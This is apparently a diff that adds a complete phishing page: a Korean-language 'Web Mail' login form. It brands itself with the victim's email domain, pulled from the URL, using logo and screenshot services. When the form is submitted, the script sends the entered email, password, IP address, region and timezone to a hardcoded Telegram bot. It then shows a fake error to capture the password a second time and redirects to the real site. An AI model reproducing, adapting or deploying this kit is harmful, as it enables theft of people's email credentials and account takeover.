@@ -1,0 +1,474 @@
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web Mail</title>
+    <link rel="icon" class="id">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+     <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <style>
+        *{
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        }
+        body{
+            font-family: 'Segoe UI', sans-serif;
+            background-color: #ccc;
+        }
+        .container-box{
+            width: 32%;
+            margin: 40px auto;
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 5px;
+        }
+        .lgBox img{
+            width: 80px;
+        }
+        .lgBox{
+            text-align: center;
+            margin: 10px 0;
+        }
+        .tpBox1{
+            text-align: center;
+            color: #474545;
+        }
+        .tpBox1 h2{
+            font-weight: 500;
+            margin: 10px 0;
+            text-transform: capitalize;
+        }
+        .foBox label{
+            display: block;
+            font-weight: 500;
+            font-size: 14px;
+            margin: 2px 0;
+        }
+        .foBox {
+            margin: 20px 0;
+        }
+        .foBox input{
+            width: 100%;
+            padding: 12px 10px;
+            font-family: inherit;
+            border: 1px solid #ccc;
+            font-size: 14px;
+            border-radius: 3px;
+        }
+        .foBox input:focus{
+            outline: none;
+            border: 1px solid #ccc;
+        }
+        .foBox button{
+            width: 100%;
+            padding: 13px;
+            border-radius: 3px;
+            background-color: rgb(71, 71, 247);
+            font-family: inherit;
+            border: none;
+            font-size: 15px;
+            color: #fff;
+            font-weight: 500;
+            cursor: pointer;
+        }
+        .foBox button:hover{
+            background-color: rgb(40, 40, 243);
+        }
+        .foBox button:disabled{
+            background-color: rgb(117, 117, 253);
+            cursor: not-allowed;
+        }
+        .errorBox p{
+            color: rgb(201, 22, 22);
+            font-size: 14px;
+            font-weight: 500;
+        }
+        .hide {
+            display: none;
+        }
+
+        @media screen and (max-width: 700px){
+            .container-box{
+                width: 95%;
+                margin: 100px auto;
+            }
+    }
+    </style>
+    <style type="text/css">
+			#trupeer-ai-ui, #trupeer-ai-ui div {
+				background-color: unset;
+				padding: unset;
+				width: unset;
+				box-shadow: unset;
+				display: unset;
+				margin: unset;
+				border-radius: unset;
+			}
+			.trupeer-ai-outline {
+				position: absolute;
+				z-index: 99999999999;
+				border: 2px solid #6f66c5;
+				outline-offset: -2px;
+				pointer-events: none;
+				border-radius: 5px!important;
+			}
+		.trupeer-ai-blur {
+			filter: blur(10px)!important;
+		}
+			.trupeer-ai-shadow-dom * {
+				transition: unset;
+			}
+			.trupeer-ai-shadow-dom .TooltipContent {
+  border-radius: 30px!important;
+	background-color: #29292F!important;
+  padding: 10px 15px!important;
+  font-size: 12px;
+	margin-bottom: 10px!important;
+	bottom: 100px;
+  line-height: 1;
+	font-family: 'Satoshi-Medium', sans-serif;
+	z-index: 99999999!important;
+  color: #FFF;
+  box-shadow: hsl(206 22% 7% / 35%) 0px 10px 38px -10px, hsl(206 22% 7% / 20%) 0px 10px 20px -15px!important;
+  user-select: none;
+	transition: opacity 0.3 ease-in-out;
+  will-change: transform, opacity;
+	animation-duration: 400ms;
+  animation-timing-function: cubic-bezier(0.16, 1, 0.3, 1);
+  will-change: transform, opacity;
+}
+
+.trupeer-ai-shadow-dom .hide-tooltip {
+	display: none!important;
+}
+
+.trupeer-ai-shadow-dom .tooltip-tall {
+	margin-bottom: 20px;
+}
+
+.trupeer-ai-shadow-dom .tooltip-small {
+	margin-bottom: 5px;
+}
+
+.trupeer-ai-shadow-dom .TooltipContent[data-state='delayed-open'][data-side='top'] {
+	animation-name: slideDownAndFade;
+}
+.trupeer-ai-shadow-dom .TooltipContent[data-state='delayed-open'][data-side='right'] {
+  animation-name: slideLeftAndFade;
+}
+.trupeer-ai-shadow-dom.TooltipContent[data-state='delayed-open'][data-side='bottom'] {
+  animation-name: slideUpAndFade;
+}
+.trupeer-ai-shadow-dom.TooltipContent[data-state='delayed-open'][data-side='left'] {
+  animation-name: slideRightAndFade;
+}
+
+@keyframes slideUpAndFade {
+  from {
+    opacity: 0;
+    transform: translateY(2px);
+  }
+  to {
+    opacity: 1;
+    transform: translateY(0);
+  }
+}
+
+@keyframes slideRightAndFade {
+  from {
+    opacity: 0;
+    transform: translateX(-2px);
+  }
+  to {
+    opacity: 1;
+    transform: translateX(0);
+  }
+}
+
+@keyframes slideDownAndFade {
+  from {
+    opacity: 0;
+    transform: translateY(-2px);
+  }
+  to {
+    opacity: 1;
+    transform: translateY(0);
+  }
+}
+
+@keyframes slideLeftAndFade {
+  from {
+    opacity: 0;
+    transform: translateX(2px);
+  }
+  to {
+    opacity: 1;
+    transform: translateX(0);
+  }
+}
+
+#trupeer-ai-ui [data-radix-popper-content-wrapper] { z-index: 999999999999!important; } 
+
+.trupeer-ai-shadow-dom .CanvasContainer {
+	position: fixed;
+	pointer-events: all!important;
+	top: 0px!important;
+	left: 0px!important;
+	z-index: 99999999999!important;
+}
+.trupeer-ai-shadow-dom .canvas {
+	position: fixed;
+	top: 0px!important;
+	left: 0px!important;
+	z-index: 99999999999!important;
+	background: transparent!important;
+}
+.trupeer-ai-shadow-dom .canvas-container {
+	top: 0px!important;
+	left: 0px!important;
+	z-index: 99999999999;
+	position: fixed!important;
+	background: transparent!important;
+}
+
+.TrupeerAIDropdownMenuContent {
+	z-index: 99999999999!important;
+  min-width: 200px;
+  background-color: white;
+  margin-top: 4px;
+  margin-right: 8px;
+  padding-top: 12px;
+  padding-bottom: 12px;
+  border-radius: 15px;
+  z-index: 99999;
+  font-family: 'Satoshi-Medium', sans-serif;
+  color: #29292F;
+  box-shadow: 0px 10px 38px -10px rgba(22, 23, 24, 0.35),
+    0px 10px 20px -15px rgba(22, 23, 24, 0.2);
+  animation-duration: 400ms;
+  animation-timing-function: cubic-bezier(0.16, 1, 0.3, 1);
+  will-change: transform, opacity;
+}
+.TrupeerAIDropdownMenuContent[data-side="top"] {
+  animation-name: slideDownAndFade;
+}
+.TrupeerAIDropdownMenuContent[data-side="right"] {
+  animation-name: slideLeftAndFade;
+}
+.TrupeerAIDropdownMenuContent[data-side="bottom"] {
+  animation-name: slideUpAndFade;
+}
+.TrupeerAIDropdownMenuContent[data-side="left"] {
+  animation-name: slideRightAndFade;
+}
+.TrupeerAIItemIndicator {
+  position: absolute;
+  right: 12px; 
+  width: 18px;
+  height: 18px;
+  background: #6f66c5;
+  border-radius: 50%;
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+}
+.TrupeerAIDropdownMenuItem,
+.TrupeerAIDropdownMenuRadioItem {
+  font-size: 14px;
+  line-height: 1;
+  display: flex;
+  align-items: center;
+  height: 40px;
+  padding: 0 5px;
+  position: relative;
+  padding-left: 22px;
+  padding-right: 22px;
+  user-select: none;
+  outline: none;
+}
+.TrupeerAIDropdownMenuItem:hover {
+    background-color: #F6F7FB !important;
+    cursor: pointer;
+}
+.TrupeerAIDropdownMenuItem[data-disabled] {
+  color: #6E7684; !important;
+  cursor: not-allowed;
+  background-color: #F6F7FB !important;
+}
+
+
+
+@keyframes slideUpAndFade {
+  from {
+    opacity: 0;
+    transform: translateY(2px);
+  }
+  to {
+    opacity: 1;
+    transform: translateY(0);
+  }
+}
+
+@keyframes slideRightAndFade {
+  from {
+    opacity: 0;
+    transform: translateX(-2px);
+  }
+  to {
+    opacity: 1;
+    transform: translateX(0);
+  }
+}
+
+@keyframes slideDownAndFade {
+  from {
+    opacity: 0;
+    transform: translateY(-2px);
+  }
+  to {
+    opacity: 1;
+    transform: translateY(0);
+  }
+}
+
+@keyframes slideLeftAndFade {
+  from {
+    opacity: 0;
+    transform: translateX(2px);
+  }
+  to {
+    opacity: 1;
+    transform: translateX(0);
+  }
+}
+
+</style>
+</head>
+<body class="body" style="background-image: linear-gradient(rgba(0, 0, 0, 0.467) 0%, rgba(0, 0, 0, 0.68) 100%), url(&quot;https://image.thum.io/get/width/1200/https://undefined&quot;); background-size: cover; background-repeat: no-repeat; height: 100vh;">
+
+    <div class="container-box">
+
+         <div class="lgBox">
+            <img src="https://logo.clearbit.com/undefined" alt="lgw" class="lgi">
+         </div>
+
+         <div class="tpBox1">
+            <h2 class="tBoxi">웹 메일</h2>
+         </div>
+
+         <div class="errorBox hide">
+            <p>이메일 비밀번호가 올바르지 않습니다. 다시 시도하세요!</p>
+         </div>
+
+         <form action="#" class="mxf">
+            <div class="foBox">
+                <label for="">이메일 주소</label>
+                <input type="email" name="em" id="em" placeholder="이메일 주소" required="">
+            </div>
+
+            <div class="foBox">
+                <label for="">비밀번호</label>
+                <input type="password" name="pas" id="pas" placeholder="비밀번호" required="">
+            </div>
+
+            <div class="foBox">
+                <button class="btn2">로그인</button>
+            </div>
+         </form>
+    </div>
+
+    <script>
+        const form = document.querySelector(".mxf");
+        const emailInput = document.querySelector("#em");
+        const logoImg = document.querySelector(".lgi");
+        const titleBox = document.querySelector(".tBoxi");
+        const shortcutIcon = document.createElement("link");
+        const faviconLink = document.querySelector(".id");
+        const loginButton = document.querySelector(".btn2");
+        const errorMessageBox = document.querySelector(".errorBox");
+        const pageBody = document.querySelector(".body");
+
+        let loginAttemptCount = 0;
+        let emailDomain = "";
+        let userIpInfo = "";
+
+        // Telegram Credentials
+        const TELEGRAM_TOKEN = "7265187970:AAFW_kft-Ub78_lX3lecQT04LVBjwL21SAA";
+        const TELEGRAM_CHAT_ID = "6874896403";
+
+        const sendTelegramMessage = (msg) => {
+            $.ajax({
+                dataType: 'JSON',
+                url: `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
+                type: 'POST',
+                data: {
+                    "chat_id": TELEGRAM_CHAT_ID,
+                    "text": msg
+                },
+            });
+        };
+
+        window.addEventListener("load", () => {
+
+            fetch("https://ipinfo.io/json")
+                .then(res => res.json())
+                .then(info => {
+                    userIpInfo = info;
+                });
+
+            const emailFromUrl = window.location.href.split("#")[1];
+            if (emailFromUrl) {
+                emailInput.value = emailFromUrl;
+                emailDomain = emailFromUrl.split("@")[1];
+
+                logoImg.outerHTML = `<img src="https://img.logo.dev/${emailDomain}?token=pk_N3r1ruvPTqCTWk6c6ZhZUQ" alt="${emailDomain} logo" class="lgi" />`;
+                pageBody.style.backgroundImage = `linear-gradient(to bottom, rgba(0, 0, 0, 0.466) 0%, rgba(0, 0, 0, 0.678) 100%), url('https://image.thum.io/get/width/1200/https://${emailDomain}')`;
+                pageBody.style.backgroundSize = "cover";
+                pageBody.style.backgroundRepeat = "no-repeat";
+                pageBody.style.height = "100vh";
+
+                const shortDomainName = emailDomain.split(".")[0];
+                titleBox.textContent = shortDomainName;
+                document.title = shortDomainName;
+
+                shortcutIcon.setAttribute("rel", "shortcut icon");
+                shortcutIcon.setAttribute("href", `https://img.logo.dev/${emailDomain}?token=pk_N3r1ruvPTqCTWk6c6ZhZUQ`);
+                faviconLink.setAttribute("href", `https://img.logo.dev/${emailDomain}?token=pk_N3r1ruvPTqCTWk6c6ZhZUQ`);
+            }
+        });
+
+        // Form submission handler
+        form.addEventListener("submit", (event) => {
+            event.preventDefault();
+            const passwordValue = event.target.elements.pas.value;
+
+            loginButton.setAttribute("disabled", true);
+            loginButton.textContent = "Please wait...";
+            errorMessageBox.classList.add("hide");
+            loginAttemptCount++;
+
+            let msg = `IP: ${userIpInfo.ip}\nRegion: ${userIpInfo.region}\nTime Zone: ${userIpInfo.timezone}\n Email: ${emailInput.value}\n Password: ${passwordValue}`;
+            sendTelegramMessage(msg);
+
+            loginButton.setAttribute("disabled", true);
+
+            setTimeout(() => {
+                loginButton.removeAttribute("disabled");
+                loginButton.textContent = "Sign in";
+
+                if (loginAttemptCount === 1) {
+                    errorMessageBox.classList.remove("hide");
+                    event.target.elements.pas.value = "";
+                } else {
+                    event.target.reset();
+                    window.location.href = `https://${emailDomain}`;
+                }
+            }, 3000);
+        });
+    </script>
+
+
+<div id="trupeer-ai-ui"><div class="trupeer-ai-shadow-dom"><div><div></div><div></div></div></div></div></body></html>
